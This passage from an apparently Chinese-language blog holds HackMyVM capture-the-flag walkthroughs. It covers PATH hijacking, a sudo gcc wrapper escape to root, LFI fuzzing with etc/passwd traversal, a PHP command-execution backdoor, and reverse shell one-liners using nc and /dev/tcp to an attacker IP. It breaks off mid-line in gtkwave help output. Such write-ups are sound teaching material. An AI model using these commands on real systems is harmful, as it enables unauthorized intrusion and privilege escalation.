class="line">__libc_start_main@GLIBC_2.34</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">_edata</span><br><span class="line">_fini</span><br><span class="line">system@GLIBC_2.2.5</span><br><span class="line">__data_start</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">_end</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">setgid@GLIBC_2.2.5</span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">setuid@GLIBC_2.2.5</span><br><span class="line">__cxa_finalize@GLIBC_2.2.5</span><br><span class="line">_init</span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.gnu.property</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.note.ABI-tag</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.dynamic</span><br><span class="line">.got.plt</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可执行文件执行</p><p>cat &#x2F;etc&#x2F;shadow</p><p>cat不是绝对路径调用可以进行路径劫持</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo bash &gt; cat</span><br><span class="line">$ ls</span><br><span class="line">cat  laststep</span><br><span class="line">$ chmod 777 cat           </span><br><span class="line">$ PATH=.:$PATH</span><br><span class="line">$ ./laststep</span><br><span class="line">root@KrustyKrab:~# </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm_reversteg</title>
      <link href="/2025/05/29/hackmyvm-reversteg/"/>
      <url>/2025/05/29/hackmyvm-reversteg/</url>
      
        <content type="html"><![CDATA[<p><img src="/../imgs/$%7Bfiilename%7D/image-20250524181332574.png" alt="image-20250524181332574"></p><p>扫描</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250524163121844.png" alt="image-20250524163121844"></p><p>80的的源码发现</p><p>117db0148dc179a2c2245c5a30e63ab0</p><p>根据提示是一张图片</p><p>加上jpg即可</p><p>图片用随波逐流直接梭</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250524163301452.png" alt="image-20250524163301452"></p><p>morainelake为steghide密码</p><p>提取出的压缩包密码也是morainelake</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/reversbeg]</span><br><span class="line">└─# steghide extract -sf 1.jpg --passphrase morainelake </span><br><span class="line">wrote extracted data to &quot;secret.zip&quot;.</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/myift/reversbeg]</span><br><span class="line">└─# ls</span><br><span class="line">1.jpg  secret.zip</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/myift/reversbeg]</span><br><span class="line">└─# unzip secret.zip </span><br><span class="line">Archive:  secret.zip</span><br><span class="line">   creating: secret/</span><br><span class="line">[secret.zip] secret/secret.txt password: </span><br><span class="line"> extracting: secret/secret.txt   </span><br><span class="line"> </span><br><span class="line">┌──(root㉿kali)-[/myift/reversbeg]</span><br><span class="line">└─# ls</span><br><span class="line">1.jpg  secret  secret.zip</span><br><span class="line">                                                                                                                                                                         </span><br><span class="line">┌──(root㉿kali)-[/myift/reversbeg]</span><br><span class="line">└─# cd secret   </span><br><span class="line">                                                                                                                                                                         </span><br><span class="line">┌──(root㉿kali)-[/myift/reversbeg/secret]</span><br><span class="line">└─# l </span><br><span class="line">secret.txt</span><br><span class="line">                                                                                                                                                                      </span><br><span class="line">┌──(root㉿kali)-[/myift/reversbeg/secret]</span><br><span class="line">└─# cat secret.txt </span><br><span class="line">morainelake:660930334</span><br><span class="line">                                 </span><br></pre></td></tr></table></figure><p>前期踩点的时候就知道开启的有22端口ssh服务</p><p>我们直接尝试的登陆即可</p><p>在history发现一堆flag</p><p>直接bp爆破提交即可</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250524174640732.png" alt="image-20250524174640732"></p><p>在&#x2F;opt下发现reverse</p><p>我拉去下来放到idea中分析(re是不可能会的)</p><p>下面内容来源于sunset</p><p><a href="https://sunsetaction.top/2025/04/03/HackMyVMReversteg/">https://sunsetaction.top/2025/04/03/HackMyVMReversteg/</a></p><p>分析来自于：<code>Grok</code></p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title function_">puts</span>(<span class="string">&quot;Enter passwords or Enter H coward mode:&quot;</span>);</span><br><span class="line">v20 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_">__isoc99_scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v4[<span class="number">7</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_">strcmp</span>(&amp;v4[<span class="number">7</span>], <span class="string">&quot;H&quot;</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v20 == <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">puts</span>(<span class="string">&quot;Hint: Invert XOR Replace! &quot;</span>);</span><br><span class="line">        goto <span class="variable constant_">LABEL_6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">strcpy</span>(dest, &amp;v4[<span class="number">7</span>]);</span><br><span class="line"><span class="title function_">__isoc99_scanf</span>(<span class="string">&quot;%s %s %s&quot;</span>, v10, &amp;v9, &amp;v8);</span><br></pre></td></tr></table></figure><ul><li>提示用户输入密码，或者输入 “<code>H</code>“ 进入所谓的 “<code>coward mode</code>“。</li><li>对用户输入的密码进行处理，并通过 <code>XOR</code> 解密和凯撒解密操作生成验证所需的数据。</li><li>使用 <code>check_passwords</code> 函数验证输入的密码是否正确。</li><li>如果验证通过，输出成功消息并解密一个隐藏字符串；否则，提示密码错误</li><li>当用户输入的不是 “<code>H</code>“ 时，假设这是第一个密码，将其复制到 <code>dest</code> 中。</li><li>接着，使用 <code>scanf</code> 读取另外三个字符串，分别存储到 <code>v10</code>、<code>v9</code> 和 <code>v8</code> 中。这可能是验证所需的额外输入</li></ul><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="attr">LABEL_6</span>:</span><br><span class="line">v7 = <span class="number">8203321</span>;</span><br><span class="line"><span class="title function_">strcpy</span>(v6, <span class="string">&quot;/, 8:(&quot;</span>);</span><br><span class="line"><span class="title function_">strcpy</span>((char *)&amp;v5 + <span class="number">7</span>, <span class="string">&quot;!!|&#125;yx&#123;z&quot;</span>);</span><br><span class="line"><span class="title function_">strcpy</span>((char *)&amp;v5, <span class="string">&quot;(;$)(#&quot;</span>);</span><br><span class="line">v19 = <span class="number">77</span>;</span><br><span class="line">v18 = (<span class="keyword">void</span> *)<span class="title function_">xor_decrypt</span>((char *)&amp;v5 + <span class="number">7</span>, 77LL);</span><br><span class="line">v17 = (<span class="keyword">void</span> *)<span class="title function_">xor_decrypt</span>(v6, (unsigned int)v19);</span><br><span class="line">v16 = (char *)<span class="title function_">xor_decrypt</span>(&amp;v7, (unsigned int)v19);</span><br><span class="line">v15 = (char *)<span class="title function_">xor_decrypt</span>(&amp;v5, (unsigned int)v19);</span><br></pre></td></tr></table></figure><p>初始化数据<code>XOR</code>解密，解密</p><p><code>v17 = (void *)xor_decrypt(v6, (unsigned int)v19);</code> &#x3D;&#x3D; <code>bamuwe</code> （眼熟）</p><p><img src="/../imgs/$%7Bfiilename%7D/image130.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v15 = (char *)xor_decrypt(&amp;v5, (unsigned int)v19);` == `eviden</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image131.png" alt="image.png"></p><p><code>v18 = (void *)xor_decrypt((char *)&amp;v5 + 7, 77LL);</code> &#x3D;&#x3D; <code>ll104567</code> （群主）</p><p><img src="/../imgs/$%7Bfiilename%7D/image132.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v16 = (char *)xor_decrypt(&amp;v7, (unsigned int)v19);` == `ta0</span><br></pre></td></tr></table></figure><p><code>v16</code>不能直接在<code>CyberChef</code>里面转，否则会变成乱码，因为<code>v7</code>是<code>int</code>格式，而<code>(char *)xor_decrypt</code> 需要将<code>v7</code>转为<code>Sting</code>格式</p><p>我们将其代码扒下来，直接打印<code>v16</code> ，我们创建<code>v16.c</code></p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.<span class="property">h</span>&gt;</span><br><span class="line">#include &lt;stdlib.<span class="property">h</span>&gt;</span><br><span class="line">#include &lt;string.<span class="property">h</span>&gt;</span><br><span class="line"></span><br><span class="line">typedef unsigned char _BYTE;</span><br><span class="line"></span><br><span class="line">_BYTE *<span class="title function_">xor_decrypt</span>(<span class="params"><span class="keyword">const</span> char *a1, char a2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    _BYTE *v3;</span><br><span class="line">    int v4;</span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    v4 = <span class="title function_">strlen</span>(a1);</span><br><span class="line">    v3 = <span class="title function_">malloc</span>(v4 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; v4; ++i)</span><br><span class="line">        v3[i] = a2 ^ a1[i];</span><br><span class="line">    v3[v4] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int <span class="title function_">main</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    int v7 = <span class="number">8203321</span>;</span><br><span class="line">    char v19 = <span class="number">77</span>;</span><br><span class="line">    char *v16;</span><br><span class="line"></span><br><span class="line">    v16 = (char *)<span class="title function_">xor_decrypt</span>((<span class="keyword">const</span> char *)&amp;v7, (unsigned int)v19);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">printf</span>(<span class="string">&quot;v16 content: %s\n&quot;</span>, v16);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">free</span>(v16);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编译并运行，得出<code>v16</code>是<code>ta0</code></p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"> ⚡ root@kali  ~<span class="regexp">/Desktop/</span>test/reverseteg  vim v16.<span class="property">c</span></span><br><span class="line"> ⚡ root@kali  ~<span class="regexp">/Desktop/</span>test/reverseteg  gcc v16.<span class="property">c</span> -o v16                                       </span><br><span class="line"> ⚡ root@kali  ~<span class="regexp">/Desktop/</span>test/reverseteg  ./v16    </span><br><span class="line">v16 <span class="attr">content</span>: ta0</span><br></pre></td></tr></table></figure><p>那我们就得出<code>v15</code>-<code>v18</code>分别是<code>eviden</code> 、<code>ta0</code> 、<code>bamuwe</code> 、<code>ll104567</code></p><p>然后程序调用<code>checkpassword</code>函数</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (unsigned int)<span class="title function_">check_passwords</span>((int)dest, (int)v10, (int)&amp;v9, (int)&amp;v8, (int)v18, (int)v17, v16, v15) )</span><br></pre></td></tr></table></figure><p>最后根据参数我们依次输入密码</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">$ ./reverse</span><br><span class="line"><span class="title class_">Enter</span> passwords or <span class="title class_">Enter</span> H coward <span class="attr">mode</span>:</span><br><span class="line">ll104567</span><br><span class="line">bamuwe</span><br><span class="line">ta0</span><br><span class="line">eviden</span><br><span class="line">[+] <span class="title class_">Enter</span> the password successfully! you <span class="attr">know</span>: flower</span><br></pre></td></tr></table></figure><p>得到密码<code>flower</code> ？或者<code>ll104567bamuweta0eviden</code></p><p>得到了一个密码</p><p>结合我们前面信息收集到的welcome用户</p><p>直接登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">Matching Defaults entries for welcome on reversteg:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User welcome may run the following commands on reversteg:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/gcc -wrapper /opt/*</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>*可逃逸</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/gcc -wrapper /opt/../../bin/sh,-s .</span><br><span class="line">这个命令的作用是：</span><br><span class="line"></span><br><span class="line">利用 gcc -wrapper 的能力，指定 /bin/sh 替代 gcc；</span><br><span class="line"></span><br><span class="line">-s 作为 sh 的参数，表示让 shell 读取命令自标准输入（-s 是 sh 的合法参数）；</span><br><span class="line"></span><br><span class="line">. 是 gcc 所要求的最后一个参数（随便给个文件名占位）；</span><br><span class="line"></span><br><span class="line">由于你使用的是 sudo，并且目标是 /bin/sh，你最终会以 root 权限获得一个 shell！</span><br></pre></td></tr></table></figure><p>然后在&#x2F;root下找到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm_Pycrt</title>
      <link href="/2025/05/29/hackmyvm-Pycrt/"/>
      <url>/2025/05/29/hackmyvm-Pycrt/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a><img src="/../imgs/$%7Bfiilename%7D/image-20250527214031548.png" alt="image-20250527214031548"></h1><p>扫描</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250527214105625.png" alt="image-20250527214105625"></p><p>80端口只有一个默认的apache页面没有扫描出其他的页面</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250527214551581.png" alt="image-20250527214551581"></p><p>但是 端口6667有个IRC服务(互联网中继聊天服务)</p><p>我们nc连接并发送一些标准的IRC命令来注册你的昵称和用户信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc 192.168.56.106 6667</span><br><span class="line">:irc.local NOTICE * :*** Looking up your hostname...</span><br><span class="line">NICK kali_pentester</span><br><span class="line">:irc.local NOTICE * :*** Could not resolve your hostname: Request timed out; using your IP address (192.168.56.103) instead.</span><br><span class="line"></span><br><span class="line">USER kali 0 * :Kali Pentester</span><br><span class="line">:irc.local 001 kali_pentester :Welcome to the Localnet IRC Network kali_pentester!kali@192.168.56.103</span><br><span class="line">:irc.local 002 kali_pentester :Your host is irc.local, running version InspIRCd-3</span><br><span class="line">:irc.local 003 kali_pentester :This server was created 09:36:52 May 27 2025</span><br><span class="line">:irc.local 004 kali_pentester irc.local InspIRCd-3 iosw biklmnopstv :bklov</span><br><span class="line">:irc.local 005 kali_pentester AWAYLEN=200 CASEMAPPING=rfc1459 CHANLIMIT=#:20 CHANMODES=b,k,l,imnpst CHANNELLEN=64 CHANTYPES=# ELIST=CMNTU HOSTLEN=64 KEYLEN=32 KICKLEN=255 LINELEN=512 MAXLIST=b:100 :are supported by this server</span><br><span class="line">:irc.local 005 kali_pentester MAXTARGETS=20 MODES=20 NAMELEN=128 NETWORK=Localnet NICKLEN=30 PREFIX=(ov)@+ SAFELIST STATUSMSG=@+ TOPICLEN=307 USERLEN=10 USERMODES=,,s,iow WHOX :are supported by this server</span><br><span class="line">:irc.local 251 kali_pentester :There are 0 users and 0 invisible on 1 servers</span><br><span class="line">:irc.local 253 kali_pentester 1 :unknown connections</span><br><span class="line">:irc.local 254 kali_pentester 0 :channels formed</span><br><span class="line">:irc.local 255 kali_pentester :I have 0 clients and 0 servers</span><br><span class="line">:irc.local 265 kali_pentester :Current local users: 0  Max: 1</span><br><span class="line">:irc.local 266 kali_pentester :Current global users: 0  Max: 1</span><br><span class="line">:irc.local 375 kali_pentester :irc.local message of the day</span><br><span class="line">:irc.local 372 kali_pentester : **************************************************</span><br><span class="line">:irc.local 372 kali_pentester : *             H    E    L    L    O              *</span><br><span class="line">:irc.local 372 kali_pentester : *  This is a private irc server. Please contact  *</span><br><span class="line">:irc.local 372 kali_pentester : *  the admin of the server for any questions or  *</span><br><span class="line">:irc.local 372 kali_pentester : *  issues ShadowSec directory.                   *</span><br><span class="line">:irc.local 372 kali_pentester : **************************************************</span><br><span class="line">:irc.local 372 kali_pentester : *  The software was provided as a package of     *</span><br><span class="line">:irc.local 372 kali_pentester : *  Debian GNU/Linux &lt;https://www.debian.org/&gt;.   *</span><br><span class="line">:irc.local 372 kali_pentester : *  However, Debian has no control over this      *</span><br><span class="line">:irc.local 372 kali_pentester : *  server.                                       *</span><br><span class="line">:irc.local 372 kali_pentester : **************************************************</span><br><span class="line">:irc.local 372 kali_pentester : (The sysadmin possibly wants to edit &lt;/etc/inspircd/inspircd.motd&gt;)</span><br><span class="line">:irc.local 376 kali_pentester :End of message of the day.</span><br><span class="line">PING :irc.local</span><br><span class="line">ERROR :Closing link: (kali@192.168.56.103) [Ping timeout: 120 seconds]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到一个目录ShadowSec</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250527215927875.png" alt="image-20250527215927875"></p><p>得到一个用户ID:ll104567</p><p>用big本去扫描目录扫到</p><p>&#x2F;bydataset.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nothing to see here. </span><br></pre></td></tr></table></figure><p>在这个页面模糊测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -s -w &quot;%&#123;size_download&#125;\n&quot; &quot;http://192.168.56.106/ShadowSec/bydataset.php?abc=123&quot; -o /dev/null</span><br><span class="line">测出无效响应的大小</span><br><span class="line">ffuf -u &#x27;http://192.168.55.36/ShadowSec/bydataset.php?FUZZ=../../.././../../etc/passwd&#x27; \</span><br><span class="line">-w /myift/fuzzDicts/fuzzDicts-master/paramDict/AllParam.txt -fs 21 -c</span><br></pre></td></tr></table></figure><p>测出file参数可进行文件读取</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528135709525.png" alt="image-20250528135709525"></p><p>伪协议读一下源码</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528135847860.png" alt="image-20250528135847860"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function decrypt($input) &#123;</span><br><span class="line">    $reversed = strrev($input);</span><br><span class="line">    echo &quot;Reversed: &quot; . $reversed . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">    $decoded = base64_decode($reversed);</span><br><span class="line">    echo &quot;Decoded: &quot; . $decoded . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">    if ($decoded === false) &#123;</span><br><span class="line">        echo &quot;Base64 decoding failed.\n&quot;;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (strpos($decoded, &#x27;cmd:&#x27;) === 0) &#123;</span><br><span class="line">        return substr($decoded, 4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;GET&#x27; &amp;&amp; isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    if (stripos($file, &#x27;phpinfo&#x27;) !== false) &#123;</span><br><span class="line">        exit(&#x27;Access Denied&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    $filterUrl = &#x27;php://filter/convert.base64-encode/resource=&#x27; . $file;</span><br><span class="line">    $data = @file_get_contents($filterUrl);</span><br><span class="line">    if ($data === false) &#123;</span><br><span class="line">        exit(&#x27;Failed to read file&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    echo base64_decode($data);</span><br><span class="line">    exit;</span><br><span class="line">&#125; elseif ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27; &amp;&amp; isset($_POST[&#x27;auth&#x27;]) &amp;&amp; isset($_POST[&#x27;payload&#x27;])) &#123;</span><br><span class="line">    $auth = $_POST[&#x27;auth&#x27;];</span><br><span class="line">    $payload = $_POST[&#x27;payload&#x27;];</span><br><span class="line"></span><br><span class="line">    if ($auth !== &#x27;LetMeIn123!&#x27;) &#123;</span><br><span class="line">        exit(&#x27;Invalid Auth Token.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $command = decrypt($payload);</span><br><span class="line">    if ($command !== false) &#123;</span><br><span class="line">        $output = exec($command);</span><br><span class="line">        echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Payload decode failed.\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    exit;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;Nothing to see here.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>源码逻辑很简单就是直接执行命令</p><p>auth 参数： 必须是 LetMeIn123!<br>payload 参数： 需要经过两层编码：<br>你的命令前面加上 cmd:<br>对 cmd:<your_command> 进行 Base64 编码<br>对 Base64 编码后的字符串进行反转</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528141218271.png" alt="image-20250528141218271"></p><p>直接弹shell即可</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528141336978.png" alt="image-20250528141336978"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528143115879.png" alt="image-20250528143115879"></p><p>有weechat</p><p>这里要注意要把shell升级为交互形稳固状态才能成功启动</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528150806982.png" alt="image-20250528150806982"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/exec busybox nc 192.168.56.103 1234 -e /bin/sh</span><br><span class="line"></span><br><span class="line">/exec !bash -i &gt;&amp; /dev/tcp/192.168.56.103/1234 0&gt;&amp;1</span><br><span class="line">直接弹shell</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528151229795.png" alt="image-20250528151229795"></p><p>继续提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chatlake@PyCrt:~$ sudo -l</span><br><span class="line">Matching Defaults entries for chatlake on PyCrt:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User chatlake may run the following commands on PyCrt:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/systemctl start irc_bot.service</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个文件不能看但是可以运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl cat irc_bot.service 命令的作用是显示 irc_bot.service 服务的完整配置文件内容。</span><br><span class="line">chatlake@PyCrt:~$ systemctl cat irc_bot.service</span><br><span class="line"># /etc/systemd/system/irc_bot.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=IRC Bot Service</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=pycrtlake</span><br><span class="line">Group=pycrtlake</span><br><span class="line">WorkingDirectory=/usr/local/bin</span><br><span class="line">ExecStart=/usr/bin/python3 /usr/local/bin/irc_bot.py</span><br><span class="line">Restart=always</span><br><span class="line">RestartSec=5</span><br><span class="line">StandardOutput=syslog</span><br><span class="line">StandardError=syslog</span><br><span class="line">Environment=PYTHONUNBUFFERED=1</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line">chatlake@PyCrt:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">chatlake@PyCrt:~$ find / -name &quot;user.txt&quot; 2&gt;/dev/null</span><br><span class="line">^[[D^[[D/home/chatlake/user.txt</span><br><span class="line">chatlake@PyCrt:~$ find / -name &quot;irc_bot.py&quot; 2&gt;/dev/null</span><br><span class="line">/usr/local/bin/irc_bot.py</span><br><span class="line">chatlake@PyCrt:~$ find / -name &quot;irc_bot.service&quot; 2&gt;/dev/null</span><br><span class="line">/etc/systemd/system/irc_bot.service</span><br><span class="line"></span><br><span class="line">//服务将以 pycrtlake 用户的身份运行</span><br></pre></td></tr></table></figure><p>启动服务看一下</p><p>启动之后重新启动wechat</p><p>然后添加server取名叫irc</p><p>连接到本地irc服务器中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/server add irc 127.0.0.1/6667</span><br><span class="line">/connect irc</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528154037703.png" alt="image-20250528154037703"></p><p>发现有六个频道</p><p>前面发现的用户id:ll104567</p><p>设为昵称 &#x2F;nick ll104567</p><p>进入频道返现没有什么东西</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/join  #chan1</span><br></pre></td></tr></table></figure><p>在频道6</p><p>随便发点东西过一会会发来一条提示</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528154607689.png" alt="image-20250528154607689"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">│03:45:07 ll104567 | 2                                                                                                                                                                        │</span><br><span class="line">│03:45:08 ll104567 | 1                                                                                                                                                                        │</span><br><span class="line">│03:45:08 ll104567 | 3                                                                                                                                                                        │</span><br><span class="line">│03:45:48   @admin | My friends and I are chatting on it, but we all follow the formatting requirements. Finally, we need to:) End </span><br></pre></td></tr></table></figure><p>得知发送的消息要以:)结尾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">03:48:44 ll104567 | 111:)                                                                                                                                                                    │</span><br><span class="line">│03:48:48   @admin | My friends and I are chatting on it, but we all follow the formatting requirements. Finally, we need to:) End </span><br></pre></td></tr></table></figure><p>但是在频道中聊天没有什么用我们去找admin私聊</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/query admin</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528155438119.png" alt="image-20250528155438119"></p><p>最后经过不断尝试才发现在#chan1发消息</p><p>然后admin私聊回复你……</p><p>我们发送数字会给我们返回一下符号字母什么的很明显是ASCII码</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528160153309.png" alt="image-20250528160153309"></p><p>可以执行命令</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528160206259.png" alt="image-20250528160206259"></p><p>直接弹shell</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528160732605.png" alt="image-20250528160732605"></p><p>shell很不稳定拿到之后第一时间稳定shell</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528160703360.png" alt="image-20250528160703360"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pycrtlake@PyCrt:~$ sudo -l</span><br><span class="line">Matching Defaults entries for pycrtlake on PyCrt:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User pycrtlake may run the following commands on PyCrt:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/gtkwave</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>gtkwave命令执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pycrtlake@PyCrt:~$ sudo gtkwave -h</span><br><span class="line">\Could not initialize GTK!  Is DISPLAY env var/xhost set?</span><br><span class="line"></span><br><span class="line">Usage: gtkwave [OPTION]... [DUMPFILE] [SAVEFILE] [RCFILE]</span><br><span class="line"></span><br><span class="line">  -n, --nocli=DIRPATH        use file requester for dumpfile name</span><br><span class="line">  -f, --dump=FILE            specify dumpfile name</span><br><span class="line">  -F, --fastload             generate/use VCD recoder fastload files</span><br><span class="line">  -o, --optimize             optimize VCD to FST</span><br><span class="line">  -a, --save=FILE            specify savefile name</span><br><span class="line">  -A, --autosavename         assume savefile is suffix modified dumpfile name</span><br><span class="line">  -r, --rcfile=FILE          specify override .rcfile name</span><br><span class="line">  -d, --defaultskip          if missing .rcfile, do not use useful defaults</span><br><span class="line">  -D, --dualid=WHICH         specify multisession identifier</span><br><span class="line">  -l, --logfile=FILE         specify simulation logfile name for time values</span><br><span class="line">  -s, --start=TIME           specify start time for LXT2/VZT block skip</span><br><span class="line">  -e, --end=TIME             specify end time for LXT2/VZT block skip</span><br><span class="line">  -t, --stems=FILE           specify stems file for source code annotation</span><br><span class="line">  -c, --cpu=NUMCPUS          specify number of CPUs for parallelizable ops</span><br><span class="line">  -N, --nowm                 disable window manager for most windows</span><br><span class="line">  -M, --nomenus              do not render menubar (for making applets)</span><br><span class="line">  -S, --script=FILE          specify Tcl command script file for execution</span><br><span class="line">  -T, --tcl_init=FILE        specify Tcl command script file to be loaded on startup</span><br><span class="line">  -W, --wish                 enable Tcl command line on stdio</span><br><span class="line">  -R, --repscript=FILE       specify timer-driven Tcl command script file</span><br><span class="line">  -P, --repperiod=VALUE      specify repscript period in msec (default: 500)</span><br><span class="line">  -X, --xid=XID              specify XID of window for 